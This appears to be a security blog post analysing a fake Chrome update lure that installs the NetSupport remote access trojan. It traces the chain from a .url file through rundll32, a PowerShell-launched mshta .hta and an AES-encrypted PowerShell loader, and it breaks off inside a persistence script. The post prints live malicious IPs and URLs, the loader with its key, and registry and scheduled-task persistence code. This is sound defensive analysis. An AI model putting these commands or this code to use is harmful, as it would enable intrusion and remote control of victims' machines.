---
layout: post
title: "Google Chrome Update? More Like Infected With Netsupport Rat!​"
categories: blog
---

Today we received an alert about and endpoint running a suspicious commandline:

`rund1132.exe C: \WINDOWS\system32\davcInt.dIl, DavSetCookie 185.252.179.64080 hxxp://185.252.179.64/Downloads`

[![7-31-23_1.png](/assets/images/7-31-23/7-31-23_1.png)](/assets/images/7-31-23/7-31-23_1.png)

This commandline downloaded a .lnk file, inside the .lnk file was the following command:

`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \W*\\\\*2\\\m*h*a*e ('http'+'s://alexiakombou.com/wp-content/uploads/2021/12/EN-localer.'+'hta')`

[![7-31-23_2.png](/assets/images/7-31-23/7-31-23_2.png)](/assets/images/7-31-23/7-31-23_2.png)


I was surprised to see davclnt.dll in use here. After some further investigation, we discovered the root of the rundll32 command was a fake Google Chrome update page that the user encountered. When they clicked to update, a .url file was downloaded

[![7-31-23_1-1.png](/assets/images/7-31-23/7-31-23_1-1.png)](/assets/images/7-31-23/7-31-23_1-1.png)

`silent.url`
<details>
	<summary>Click to expand</summary>
	<pre>
		
[InternetShortcut]
URL=file:\\185.252.179.64@80\Downloads\silentupdater-chr(v105).lnk
ShowCommand=7
IconIndex=96
IconFile=C:\Windows\System32\shell32.dll

	</pre>

</details>



When launched, this prompted Window to execute rundll32,davclnt.dll and connect to the malicious ip to download the .lnk file.
The contents of the .lnk file were the powershell command to run mshta.

.hta files are fun, a lot of opportunity for some shenanigans. Let's see what's inside.

[![7-31-23_3.png](/assets/images/7-31-23/7-31-23_3.png)](/assets/images/7-31-23/7-31-23_3.png)

Mhmm.

[![7-31-23_4.png](/assets/images/7-31-23/7-31-23_4.png)](/assets/images/7-31-23/7-31-23_4.png)

Yup.

[![7-31-23_5.png](/assets/images/7-31-23/7-31-23_5.png)](/assets/images/7-31-23/7-31-23_5.png)

Definitely valid business use case here!

This .hta file uses some number/string character substitution and a string of eval statements to run the variable 'res' that is set on line 63.

Inside the parent Execute statement is an incredible amount of quotes.

[![7-31-23_6.png](/assets/images/7-31-23/7-31-23_6.png)](/assets/images/7-31-23/7-31-23_6.png)

The massive amount of double quotes will be canceled out, and serve as a simple method to defeat analysis and attempt to evade EDR tools. It also obfuscates the true nature of the eval statements by hiding the name of the variable that the script intends to execute.

So since this is vbscript, the easiest way to pull out the code hidden in here is to change the Execute statement to write to a file instead of actually executing the code in 'res'.

`VBscript`
<details>
	<summary>Click to expand</summary>
    <pre>

Set objFsO-CreateObject ("Scripting. FileSystemObject") outFile="c: \users\rem\desktop\file.txt"
Set objFile = objFSO. CreateTextFile (outFile, True)
objFile.Write res & vCrLf objFile.Close

    </pre>
</details>



[![7-31-23_7.png](/assets/images/7-31-23/7-31-23_7.png)](/assets/images/7-31-23/7-31-23_7.png)


Now we can simply double click the .hta file, and let Windows execute it with mshta, as expected, and the .hta file will no longer execute the malicious code, but dump it to disk.

`Powershell encoded command`
<details>
	<summary>Click to expand</summary>
    <pre>
    
    soM = "powershell.exe -ExecutionPolicy UnRestricted Start-Process 'cmd.exe' -WindowStyle hidden -ArgumentList {/c powershell.exe $pZkRiaJD = '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';$qWbMznzH = 'YUN2QllYR0Z6aHdIZ2FldWJ1RkZEdXhLcUxYQWVja3c=';$fZhgSgXh = New-Object 'System.Security.Cryptography.AesManaged';$fZhgSgXh.Mode = [System.Security.Cryptography.CipherMode]::ECB;$fZhgSgXh.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;$fZhgSgXh.BlockSize = 128;$fZhgSgXh.KeySize = 256;$fZhgSgXh.Key = [System.Convert]::FromBase64String($qWbMznzH);$NTgie = [System.Convert]::FromBase64String($pZkRiaJD);$iVtnQAzt = $NTgie[0..15];$fZhgSgXh.IV = $iVtnQAzt;$URkhGcvDV = $fZhgSgXh.CreateDecryptor();$zixRPvNOX = $URkhGcvDV.TransformFinalBlock($NTgie, 16, $NTgie.Length - 16);$fZhgSgXh.Dispose();$MgWn = New-Object System.IO.MemoryStream( , $zixRPvNOX );$qWishCR = New-Object System.IO.MemoryStream;$iuyBLJBDj = New-Object System.IO.Compression.GzipStream $MgWn, ([IO.Compression.CompressionMode]::Decompress);$iuyBLJBDj.CopyTo( $qWishCR );$iuyBLJBDj.Close();$MgWn.Close();[byte[]] $ACedLT = $qWishCR.ToArray();$yaPSZfZ = [System.Text.Encoding]::UTF8.GetString($ACedLT);$yaPSZfZ | powershell - }"

    </pre>
</details>


[![7-31-23_8.png](/assets/images/7-31-23/7-31-23_8.png)](/assets/images/7-31-23/7-31-23_8.png)

Better!

Still hard to read, but the most interesting bit is clearly in the middle with the encoded powershell command.

The 'cTE' function is to create char codes for line 20, which converts to 'wscript.shell' and then invokes the powershell script in line 21.
The rest of this code looks useless!

To decode the powershell, I will stick it in vscode and reformat it(replacing the semicolons with new lines), then stick it into ise.

`Powershell`
<details>
	<summary>Click to expand</summary>
    <pre>


    $pZkRiaJD = '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'

    $qWbMznzH = 'YUN2QllYR0Z6aHdIZ2FldWJ1RkZEdXhLcUxYQWVja3c='
    $fZhgSgXh = New-Object 'System.Security.Cryptography.AesManaged'
    $fZhgSgXh.Mode = [System.Security.Cryptography.CipherMode]::ECB
    $fZhgSgXh.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $fZhgSgXh.BlockSize = 128
    $fZhgSgXh.KeySize = 256
    $fZhgSgXh.Key = [System.Convert]::FromBase64String($qWbMznzH)
    $NTgie = [System.Convert]::FromBase64String($pZkRiaJD)
    $iVtnQAzt = $NTgie[0..15]
    $fZhgSgXh.IV = $iVtnQAzt
    $URkhGcvDV = $fZhgSgXh.CreateDecryptor()
    $zixRPvNOX = $URkhGcvDV.TransformFinalBlock($NTgie, 16, $NTgie.Length - 16)
    $fZhgSgXh.Dispose()
    $MgWn = New-Object System.IO.MemoryStream( , $zixRPvNOX )
    $qWishCR = New-Object System.IO.MemoryStream
    $iuyBLJBDj = New-Object System.IO.Compression.GzipStream $MgWn, ([IO.Compression.CompressionMode]::Decompress)
    $iuyBLJBDj.CopyTo( $qWishCR )
    $iuyBLJBDj.Close()
    $MgWn.Close()
    [byte[]] $ACedLT = $qWishCR.ToArray()
    $yaPSZfZ = [System.Text.Encoding]::UTF8.GetString($ACedLT)
    $yaPSZfZ | powershell -

    </pre>
</details>

The first line is a large base64, encrypted, compressed blob.
The rest of the code looks like this

[![7-31-23_9.png](/assets/images/7-31-23/7-31-23_9.png)](/assets/images/7-31-23/7-31-23_9.png)

Nothing special here, decrypting, converting and then decompressing the payload. 
Now we can get this second payload by simple changing line 24 to:

[![7-31-23_10.png](/assets/images/7-31-23/7-31-23_10.png)](/assets/images/7-31-23/7-31-23_10.png)

This will give us the second powershell script, which is another long oneliner, so back into VSCode to re-format and then back to ISE.

[![7-31-23_11.png](/assets/images/7-31-23/7-31-23_11.png)](/assets/images/7-31-23/7-31-23_11.png)

[![7-31-23_12.png](/assets/images/7-31-23/7-31-23_12.png)](/assets/images/7-31-23/7-31-23_12.png)


This is fun.

I went ahead and did some further decoding/renameing to make the scripts intentions a little more clear.

`Powershell`

<details>
	<summary>Click to expand</summary>
    <pre>
	function WriteAllBytes($WAB_1, $WAB_2)
{
    [IO.File]::WriteAllBytes($WAB_1, $WAB_2)
}

$ghyth = 0

function CheckPath_Unzip ($appdata_path)
{
        if ($appdata_path.EndsWith(".zip") -eq $True)
            {
                $fwef = '\' + (Get-Item $appdata_path).Basename
                $Script:fghrth = Join-Path $WWC $fwef
                Expand-Archive -Path $appdata_path -DestinationPath $fghrth
                $Script:ghyth = 1
                del $appdata_path
            }

    else
        {
            if ($ghyth -eq 1)
            {
                mv -Path $appdata_path -Destination $fghrth
            $appdata_path = Join-Path $fghrth client32.exe
            }

        $asdf = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('REG Add "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00A
        A002F954E}\shell\open\command" /f /ve /t REG_SZ /d ' + $appdata_path + '
        $Action = (New-ScheduledTaskAction -Execute ' + $appdata_path + ')
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        Register-ScheduledTask -TaskName "BackgroundCheck" -Action $Action -Trigger $Trigger -RunLevel "HCheckPath_Unzipest
        " -Force
        Start-Process ' + $appdata_path))

        $abmq = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('DQAKAEEAZABkAC0AVAB5AHAAZQAgAC0ATgBhAG0AZQAgAEMAbwBuAHMAbwBsAGUAVQB0AGkAbABzACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAFcAUABJAEEAIAAtAE0AZQBtAGIAZQByAEQAZQBmAGkA
        bgBpAHQAaQBvAG4AIABAACcADQAKAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHUAcwBlAHIAMwAyAC4AZABsAGwAIgApAF0ADQAKAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGkAbgB0ACAAUABvAHMAdABNAGUAcwBzAGEAZwBlACgAaQBuAHQAIABoAFcAbgBkACwAIAB1AGkAbgB0ACAATQBzAGcALAAgAGkAbgB0ACAAdwBQAGEAcgBh
        AG0ALAAgAGkAbgB0ACAAbABQAGEAcgBhAG0AKQA7AA0ACgBwAHUAYgBsAGkAYwAgAGMAbwBuAHMAdAAgAGkAbgB0ACAAVwBNAF8AQwBIAEEAUgAgAD0AIAAwAHgAMAAxADAAMAA7AA0ACgAnAEAADQAKAEYAdQBuAGMAdABpAG8AbgAgAHMAYwByAGkAcAB0ADoAUwBlAHQALQBJAE4ARgBGAGkAbABlACAAewBbAEMAbQBkAGwAZQB0AEIAaQBuAGQAaQBuAGcAKAApAF0A
        UABhAHIAYQBtACAAKAAkAEkAbgBmAEYAaQBsAGUATABvAGMAYQB0AGkAbwBuACAAPQAgACIAJABlAG4AdgA6AHQAZQBtAHAAXABDAE0AUwBUAFAALgBpAG4AZgAiACwAWwBTAHQAcgBpAG4AZwBdACQAQwBvAG0AbQBhAG4AZABUAG8ARQB4AGUAYwB1AHQAZQAgAD0AIAAnAA==')) + 'powershell.exe -ExecutionPolicy unrestricted -WindowStyle hid
        den -Encoded " ' + $asdf + '"' + [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JwApACQASQBuAGYAQwBvAG4AdABlAG4AdAA9AEAAIgANAAoAWwB2AGUAcgBzAGkAbwBuAF0ADQAKAFMAaQBnAG4AYQB0AHUAcgBlACAAPQBgACQAYwBoAGkAYwBhAGcAbwBgACQADQAKAEEAZAB2AGEAbgBjAGUAZABJA
        E4ARgAgAD0AIAAyAC4ANQANAAoAWwBEAGUAZgBhAHUAbAB0AEkAbgBzAHQAYQBsAGwAXQANAAoAQwB1AHMAdABvAG0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAPQAgAEMAdQBzAHQASQBuAHMAdABEAGUAcwB0AFMAZQBjAHQAaQBvAG4AQQBsAGwAVQBzAGUAcgBzAA0ACgBSAHUAbgBQAHIAZQBTAGUAdAB1AHAAQwBvAG0AbQBhAG4AZABzACAAPQAgAFIAdQBuAFAAc
        gBlAFMAZQB0AHUAcABDAG8AbQBtAGEAbgBkAHMAUwBlAGMAdABpAG8AbgANAAoAWwBSAHUAbgBQAHIAZQBTAGUAdAB1AHAAQwBvAG0AbQBhAG4AZABzAFMAZQBjAHQAaQBvAG4AXQANAAoAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACQAQwBvAG0AbQBhAG4AZABUAG8ARQB4AGUAYwB1AHQAZQANAAoAdABhAHMAawBrAGkAbABsACAALwBJAE0AIABjA
        G0AcwB0AHAALgBlAHgAZQAgAC8ARgANAAoAWwBDAHUAcwB0AEkAbgBzAHQARABlAHMAdABTAGUAYwB0AGkAbwBuAEEAbABsAFUAcwBlAHIAcwBdAA0ACgA0ADkAMAAwADAALAA0ADkAMAAwADEAPQBBAGwAbABVAFMAZQByAF8ATABEAEkARABTAGUAYwB0AGkAbwBuACwAIAA3AA0ACgBbAEEAbABsAFUAUwBlAHIAXwBMAEQASQBEAFMAZQBjAHQAaQBvAG4AXQANAAoAI
        gBIAEsATABNACIALAAgACIAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQBwAHAAIABQAGEAdABoAHMAXABDAE0ATQBHAFIAMwAyAC4ARQBYAEUAIgAsACAAIgBQAHIAbwBmAGkAbABlAEkAbgBzAHQAYQBsAGwAUABhAHQAaAAiACwAIAAiACUAVQBuAGUAeABwA
        GUAYwB0AGUAZABFAHIAcgBvAHIAJQAiACwAIAAiACIADQAKAFsAUwB0AHIAaQBuAGcAcwBdAA0ACgBTAGUAcgB2AGkAYwBlAE4AYQBtAGUAPQAiAE4AbwB0AGUAcABhAGQAIgANAAoAUwBoAG8AcgB0AFMAdgBjAE4AYQBtAGUAPQAiAE4AbwB0AGUAcABhAGQAIgANAAoAIgBAADsAJABJAG4AZgBDAG8AbgB0AGUAbgB0ACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgACQAS
        QBuAGYARgBpAGwAZQBMAG8AYwBhAHQAaQBvAG4AIAAtAEUAbgBjAG8AZABpAG4AZwAgAEEAUwBDAEkASQB9AEYAdQBuAGMAdABpAG8AbgAgAEcAZQB0AC0ASAB3AG4AZAB7AFsAQwBtAGQAbABlAHQAQgBpAG4AZABpAG4AZwAoACkAXQBQAGEAcgBhAG0AKABbAFAAYQByAGEAbQBlAHQAZQByACgATQBhAG4AZABhAHQAbwByAHkAPQAkAFQAcgB1AGUALABWAGEAbAB1A
